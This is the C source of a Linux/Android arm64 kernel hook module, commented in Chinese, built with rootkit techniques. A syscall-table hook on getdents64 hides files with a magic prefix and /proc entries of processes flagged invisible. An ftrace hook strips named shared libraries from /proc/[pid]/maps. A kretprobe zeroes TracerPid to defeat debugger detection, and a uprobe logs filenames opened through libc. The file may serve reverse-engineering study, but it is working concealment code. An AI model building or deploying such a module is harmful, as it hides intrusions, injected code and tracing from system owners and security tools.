#include "linux/types.h"
#define pr_fmt(fmt) "hookmodule: " fmt
#include "asm-generic/rwonce.h"
#include "linux/sched/task.h"
#include "linux/seq_file.h"
#include "linux/kprobes.h"
#include "linux/pid_namespace.h"
#include "linux/sched.h"
#include "linux/dcache.h"
#include "linux/moduleparam.h"
#include "linux/proc_ns.h"
#include "linux/stddef.h"
#include <linux/module.h>
#include "asm/ptrace.h"
#include "kprobehook.h"
#include "ftracehook.h"
#include "linux/dirent.h"
#include "linux/gfp_types.h"
#include "linux/kernel.h"
#include "linux/linkage.h"
#include "linux/printk.h"
#include "linux/slab.h"
#include <linux/fs_struct.h>
#include <linux/fdtable.h>
#include "systemtabhook.h"
#include "uprobehook.h"

#define MAX_NAMES 16

static int target_pid =0;
module_param(target_pid,int,0644);
MODULE_PARM_DESC(target_pid,"Target PID to hook");

static int target_uid =-1;
module_param(target_uid,int,0644);
MODULE_PARM_DESC(target_uid,"Target UID to hook");

static char *hide_so[MAX_NAMES];
static int hide_so_cnt;
module_param_array(hide_so, charp, &hide_so_cnt, 0644);
MODULE_PARM_DESC(hide_so, "Shared object to hide in /proc/[pid]/maps");


/** system tab call hook functions start */
#define MAGIC_PREFIX "hookmodule"

#define PF_INVISIBLE 0x10000000

static t_syscall orig_getdents64; 

static struct task_struct *find_task(pid_t pid){
    struct task_struct *p;
    //从进程链表中寻找 PID 对应的 task_struct
    for_each_process(p){
        if(p->pid ==pid){
            return p;
        }
    }
    return NULL;
}

static int is_invisible(pid_t pid){
    struct task_struct *task;
    if(!pid)
        return 0;
    task = find_task(pid);
    if(!task)
        return 0;
    if(task->flags & PF_INVISIBLE){
        return 1;
    }
    return 0;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs){
    int fd = (int)pt_regs->regs[0];
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->regs[1];
    pr_info("orig getdents64 address is %p",orig_getdents64);
    int ret = orig_getdents64(pt_regs),err;
    unsigned short proc=0;
    unsigned long off =0;
    struct linux_dirent64 *dir,*kdirent,*prev=NULL;
    struct inode *d_inode;

    if(ret<=0){
        return ret;
    }
    kdirent = kzalloc(ret, GFP_KERNEL);
    if(kdirent ==NULL){
        return ret;
    }
    err = copy_from_user(kdirent,dirent,ret);
    if(err)
        goto out;
    /**
    current                             // 当前 task_struct
        ->files                           // struct files_struct：进程的文件表
            ->fdt                           // struct fdtable：真正的 fd 数组
            ->fd[fd]                      // struct file*：这个 fd 对应的文件
                ->f_path                    // struct path：路径信息
                .dentry                   // struct dentry*：目录项（包含文件名等）
                    ->d_inode               // struct inode*：实际文件节点
    */
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    //当前列出的目录是 /proc 的根目录，并且属于 proc 虚拟文件系统。
    if(d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)){
        proc = 1;
    }

    while(off<ret){
        //外层循环：按 d_reclen 遍历所有目录项
        /**
            +-----------------+------------------+------------------+------
            |  entry0         |  entry1          |  entry2          | ...
            | d_reclen = a    | d_reclen = b     | d_reclen = c     |
            +-----------------+------------------+------------------+------
            ^
            kdirent (off=0)

            下一次 off = a
            再下一次 off = a + b
            ...
            直到 off >= ret 结束
        */
        dir = (void*)kdirent+off;
        if((!proc && (memcmp(MAGIC_PREFIX,dir->d_name,strlen(MAGIC_PREFIX)) == 0))
             ||
            //simple_strtoul(dir->d_name, NULL, 10) 把目录名转成 pid
            //is_invisible(pid) 用 rootkit 自己的逻辑判断这个 pid 是否被标记为“隐形进程”,返回true要隐藏这个进程目录
            (proc && is_invisible(simple_strtoul(dir->d_name,NULL,10))))
        {
            pr_info("hook sucess");
            if(dir == kdirent){
                /**情况 1：当前条目就是缓冲区里的第一条（头结点）
                [kdirent]
                |
                v
                +---------+---------+---------+-------...
                | entryA  | entryB  | entryC  | ...
                +---------+---------+---------+-------
                ^ dir

                entryA 是第一条目录项
                删除策略是 物理挪动内存
                */
                ret-=dir->d_reclen;//总长度减掉当前这条的长度
                memmove(dir,(void*)dir+dir->d_reclen,ret);//后面整块 [entryB, entryC, ...] 往前拷贝，覆盖掉 entryA
                continue;//重新进入 while，不更新 off，此时新的 dir 又指向刚才被挪上来的 entryB
            }
            /**情况 2：要删除的不是第一条，而是中间某一条
            这种情况下不挪动内存，而是做一个 “逻辑拼接” 操作：
            假设现在结构是：
            [ entryA ][ entryB ][ entryC ] ...
            ^prev     ^dir
            如果 B 要被删除，那我们直接让 entryA 的长度变成：reclen(A) = reclen(A) + reclen(B)
            对于用户态的 getdents64 调用方来说，它遍历这个 buffer 的方式也是：
            entry = (char *)buf;
            while (entry < buf + ret) {
                // 处理 entry
                entry += entry->d_reclen;
            }
            当它处理 A 的时候：
	        •	它会从 entry += A->d_reclen 直接跳过 B 的内容，落到 C 的起始地址
            */
            prev->d_reclen+=dir->d_reclen;
        }else{
            //如果不需要隐藏，就更新prev
            prev=dir;
        }
        off+=dir->d_reclen;
    }
    err = copy_to_user(dirent,kdirent,ret);
out:
    kfree(kdirent);
    return ret;
}

static struct systemcall_hook my_kprobe_system_hooks[]={
    SYSTEMCALL_HOOK(__NR_getdents64,hacked_getdents64,&orig_getdents64,true),
};

/** system tab call hook functions end */


/** ftrace hook functions start*/
#define SYSCALL_NAME(name) ("__arm64_" name)
static asmlinkage long (*real_sys_getdents64)(const struct pt_regs *regs);
static asmlinkage void (*real_show_map_vma)(struct seq_file *m, struct vm_area_struct *vma);
/* 关闭尾调用优化（尽量按函数粒度使用） */
#if defined(__clang__)
#  if __has_attribute(disable_tail_calls)
#    define ATTR_NO_TAILCALL __attribute__((disable_tail_calls))
#  else
#    define ATTR_NO_TAILCALL /* 无法禁用，留空 */
#  endif
#else /* 偏向 GCC */
#  define ATTR_NO_TAILCALL __attribute__((optimize("-fno-optimize-sibling-calls")))
#endif

static void parese_and_print_dirents_user(unsigned long user_buf,long nbytes){
    /**user_buf
    +------------+------------+------------+-----+
    | entry1     | entry2     | entry3     | ... |
    | "file1"    | "dirA"     | "notes.txt"|     |
    +------------+------------+------------+-----+
    */
    char *kbuf=NULL;
    long offset =0;

    if(nbytes<=0 || user_buf ==0){
        return;
    }
    /*限制最大复制大小以防 OOM(这里设置为 1MB)*/
    if(nbytes>(1<<20)){
        pr_info("nbytes to long:(%ld),limit 1MB\n",nbytes);
        nbytes=(1<<20);
    }
    kbuf = kmalloc(nbytes,GFP_KERNEL);
    if(!kbuf){
        pr_err("kmalloc failed,大小 %ld\n",nbytes);
        return;
    }
    if(copy_from_user(kbuf,(void __user *)user_buf,nbytes)){
        pr_warn("copy_from_user failed (dirents) \n");
        kfree(kbuf);
        return;
    }
    while(offset < nbytes){
        struct linux_dirent64 *d =(struct linux_dirent64 *)(kbuf+offset);
        size_t reclen;
        size_t namelen;
        char name[256];

        /*基本检查：剩余数据是否足够*/
        if(offset + offsetof(struct linux_dirent64,d_name)>=(size_t)nbytes)
            break;

        reclen =d->d_reclen;
        if(reclen==0){
            break;
        }
        namelen = reclen-offsetof(struct linux_dirent64,d_name);
        if (namelen > sizeof(name) - 1)
			namelen = sizeof(name) - 1;
        if(offset+offsetof(struct linux_dirent64,d_name)+namelen>((size_t)nbytes))
            break;
        memcpy(name,d->d_name,namelen);
        		/* 打印目录项信息（只读） */
		pr_info("pid=%d uid=%u inode=%llu type=%u name=%s\n",
		        current->pid, __kuid_val(current_uid()),
		        (unsigned long long)d->d_ino, (unsigned int)d->d_type, name);

		offset += reclen;
    }
    kfree(kbuf);
}

static ATTR_NO_TAILCALL asmlinkage long fh_sys_getdents64(struct pt_regs *regs){
    unsigned long user_buf =0;
    long ret;
    /*从regs 中提取参数：不同架构寄存器位置不同*/
    user_buf = regs->regs[1];
    ret = real_sys_getdents64(regs);
    /*调用后打印返回值*/
    pr_info("getdents64() after:pid=%d ret=%ld\n",current->pid,ret);

    /*若返回了数据，则尝试解析用户缓冲区并打印每个d_name(只读)*/
    if(ret>0&&user_buf)
       parese_and_print_dirents_user(user_buf,ret); 
    return ret;
}

static ATTR_NO_TAILCALL asmlinkage void fh_show_map_vma(struct seq_file *m, struct vm_area_struct *vma){
    char path_buf[NAME_MAX];
    char *pathname;

    //基本安全检查
    if(!vma || !vma->vm_file || !vma->vm_mm){
        real_show_map_vma(m,vma);
        return;
    }

    //检查是否需要按PID过滤
    if(target_pid>0 && current->pid !=target_pid){
        real_show_map_vma(m,vma);
        return;
    }

    //安全地获取文件路径
    pathname = d_path(&vma->vm_file->f_path, path_buf, sizeof(path_buf));
    if (IS_ERR(pathname)){
        real_show_map_vma(m,vma);
        return;
    }

    //检查是否是目标库
    for(int i =0;i<hide_so_cnt;i++){
        if(strstr(pathname,hide_so[i])){
            pr_info("Hiding target library %s form PID %d maps\n",hide_so[i],current->pid);
            // 直接返回，不调用原始函数，从而隐藏这个VMA条目
            return;
        }
    }

    //不是目标库，调用原始函数正常显示
    real_show_map_vma(m,vma);
    return; 
}

static struct ftrace_hook my_hooks[]={
    FTRACEHOOK(SYSCALL_NAME("sys_getdents64"),fh_sys_getdents64,&real_sys_getdents64,false),
    FTRACEHOOK("show_map_vma", fh_show_map_vma, &real_show_map_vma, true),
};
/** ftrace hook functions end*/

/** kprobe hook functions start */

// 全局序号用于记录执行顺序
static atomic_t sequence_counter = ATOMIC_INIT(0);
static int kprobe_pre_handler_proc_pid_status(struct kprobe *p, struct pt_regs *regs){
    int seq = atomic_inc_return(&sequence_counter);
    pr_info("[SEQ:%d] KPROBE PRE_HANDLER: proc_pid_status called\n", seq);
    return 0;
}

static void kprobe_post_handler_proc_pid_status(struct kprobe *p, struct pt_regs *regs,unsigned long flags){
    int seq = atomic_inc_return(&sequence_counter);
    pr_info("[SEQ:%d] KPROBE POST_HANDLER: proc_pid_status finished\n", seq);
}


static struct kprobe_wrap my_kprobes[]={
    KPROBEHOOK("proc_pid_status",kprobe_pre_handler_proc_pid_status,kprobe_post_handler_proc_pid_status,true),
};


static int kretprobe_entry_handler_proc_pid_status(struct kretprobe_instance *ri,struct pt_regs *regs){
    struct kretprobe_data *data;
    struct task_struct *task;
    struct seq_file *m;
    struct pid_namespace *ns;
    struct pid *pid;
    int seq = atomic_inc_return(&sequence_counter);

    data = (struct kretprobe_data *)ri->data;
    data->task = NULL;
    data->sequence_id = seq;

    pr_info("[SEQ:%d] KREPROBE ENTRY_HANDLER:proc_pid_status entry\n",seq);
    //这里取值是对应被hook的函数的参数,r0,r1,r2,r3,
    /*
    int proc_pid_status(struct seq_file *m,
                    struct pid_namespace *ns,
                    struct pid *pid,
                    struct task_struct *task)
    */
    m = (struct seq_file *)regs->regs[0];
    ns = (struct pid_namespace *)regs->regs[1];
    pid = (struct pid *)regs->regs[2];
    task = (struct task_struct *)regs->regs[3];
    
    // 基本安全检查
    if(!task){
        return 0;
    }
    //检查是否是内核线程
    if(!task->mm){
        return 0;
    }

    //获取任务引用，防止任务在处理过程中被释放 
    get_task_struct(task);

    //安全地修改任务状态
    task_lock(task);
    data->task = task;
    data->original_ptrace = task->ptrace; //保存原始TracerPid

    data->original_state = READ_ONCE(task->__state); //保存原始任务状态
    if(data->original_state == TASK_TRACED){
        WRITE_ONCE(task->__state, TASK_RUNNING); //安全地修改任务状态
        pr_info("Modified task state from TASK_TRACE to TASK_RUNNING for process %d\n",task->pid);
    }
    pr_info("Modified TracerPid for process %d to 0\n",task->pid);
    task->ptrace =0; //设置TracerPid为0
    task_unlock(task);
    return 0;
}   


static int kretprobe_ret_handler_porc_pid_status(struct kretprobe_instance *ri,struct pt_regs *regs){
    struct kretprobe_data *data = (struct kretprobe_data*)ri->data;
    struct task_struct *task = data->task;
    int seq = atomic_inc_return(&sequence_counter);
    pr_info("[SEQ:%d] KRETPROBE HANDLER :proc_pid_status return (entry was SEQ:%d)\n",
        seq,data->sequence_id);
    
    if(!task)
        return 0;
    //灰度任务状态
    task_lock(task);
    task->ptrace = data->original_ptrace; //恢复原始TracerPid

    if(data->original_state == TASK_TRACED){
        WRITE_ONCE(task->__state, data->original_state);//安全地恢复原始任务状态
        pr_info("[SEQ:%d] Restored task state to TASK_TRACED for process %d\n"
            ,seq,task->pid);
    }
    task_unlock(task);
    pr_info("[SEQ:%d] Restored TracerPid for process %d to %d\n", seq, task->pid, data->original_ptrace);
    //释放任务引用
    put_task_struct(task);
    return 0;
}


static struct kretprobe_wrap my_kretprobes[]={
    KRETPROBEHOOK(kretprobe_ret_handler_porc_pid_status,kretprobe_entry_handler_proc_pid_status,sizeof(struct kretprobe_data),"proc_pid_status",true),
};

/** kprobe hook functions end */

/** uprobe hook functions start */

#define TARGET_PATH_LIBC "/apex/com.android.runtime/lib64/bionic/libc.so"
#define SYMBOL_NSME_OPENAT "openat"

static int uprobe_handler_openat(struct uprobe_consumer *self, struct pt_regs *regs) {
    char __user *filename;
    char filename_buf[256];
    char output_buf[512];
    ssize_t filename_len;

    filename = (char __user *)regs->regs[1];

    //从用户空间读取文件名
    filename_len = strncpy_from_user(filename_buf,filename,sizeof(filename_buf)-1);
    if(filename_len <0){
        print_string("uprobes:Failed to copy filename from userspace");
        return -EFAULT;
    }

    //空终止字符串，确保没有缓冲区溢出
    filename_buf[filename_len]='\0';

    //检查文件名长度是否有效
    if(filename_len ==0 || filename_len >=sizeof(filename_buf)){
        print_string("uprobes: Filename length is invalid, too long or zero");
        return -EFAULT;
    }

    //格式化输出信息并打印到tty
    snprintf(output_buf, sizeof(output_buf), "uprobes: [UID:%u] openat() filename: %s",from_kuid(&init_user_ns, current_uid()) ,filename_buf);
    print_string(output_buf);

    //用’a'字符替换文件名
    memset(filename_buf,'a',filename_len);
    filename_buf[filename_len]='\0';

    //确保用户内存在写回之前是有效的
    if (!access_ok(filename,filename_len)){
        print_string("uprobes: Invalid user memory address");
        return -EFAULT;
    }

    // 将修改后的文件名复制回用户空间
    // if (copy_to_user(filename, filename_buf, filename_len)) {
    //    print_string("uprobes: Failed to copy new filename to userspace");
    //    return -EFAULT;
    //}
    return 0;
}

static struct uprobe_wrap my_uprobes[]={
    UPROBEHOOK(TARGET_PATH_LIBC,SYMBOL_NSME_OPENAT,uprobe_handler_openat,NULL,true),
};

/** uprobe hook functions end */

static int __init hookmodule_init(void){
    int ret;
    ret = kprobehook_init(my_kprobes,ARRAY_SIZE(my_kprobes),my_kretprobes,ARRAY_SIZE(my_kretprobes));
    if(ret<0){
        pr_err("kprobehook_init failed,errno:%d\n",ret);
        return ret;
    }
    ret = systemcall_hook_init(my_kprobe_system_hooks,ARRAY_SIZE(my_kprobe_system_hooks));
    if(ret<0){
        pr_err("kprobehook_init failed,errno:%d\n",ret);
        return ret;
    }
    ret = fh_install_hooks(my_hooks,ARRAY_SIZE(my_hooks));
    if(ret<0){
        pr_err("ftrace_hook_init failed,errno:%d\n",ret);
        systemcall_hook_exit(my_kprobe_system_hooks,ARRAY_SIZE(my_kprobe_system_hooks));
        return ret;
    }
    ret = uprobe_init(my_uprobes, ARRAY_SIZE(my_uprobes), target_uid);

    return 0;
}


static void __exit hookmodule_exit(void){
    pr_info("hookmodule exit\n");
    uprobe_exit(my_uprobes, ARRAY_SIZE(my_uprobes), target_uid);
    fh_remove_hooks(my_hooks,ARRAY_SIZE(my_hooks));
    systemcall_hook_exit(my_kprobe_system_hooks,ARRAY_SIZE(my_kprobe_system_hooks));
    kprobehook_exit(my_kprobes,ARRAY_SIZE(my_kprobes),my_kretprobes,ARRAY_SIZE(my_kretprobes));
    orig_getdents64=NULL;
}
MODULE_LICENSE("GPL");
MODULE_AUTHOR("nuoen");
MODULE_DESCRIPTION("hook module");


module_init(hookmodule_init);
module_exit(hookmodule_exit);